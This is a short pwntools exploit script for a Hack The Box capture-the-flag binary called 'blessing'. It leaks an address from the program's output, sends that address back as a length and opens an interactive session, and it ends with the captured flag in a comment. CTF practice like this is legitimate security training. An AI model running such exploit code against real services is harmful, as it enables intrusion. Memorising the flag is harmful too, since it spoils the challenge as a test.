from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b*main
b*main+273
continue
'''.format(**locals())

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = './blessing_patched' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.recvuntil(b'Please accept this: ')
v6 = int(io.recv(14), 16)

offset = v6 

io.sendlineafter(b'length:', str(v6))

io.sendline(b'0')

log.info(f"Leaked v6: {hex(v6)}")


io.interactive()

#HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_729f90bfc09af1b811ca3e1df2b3ad02}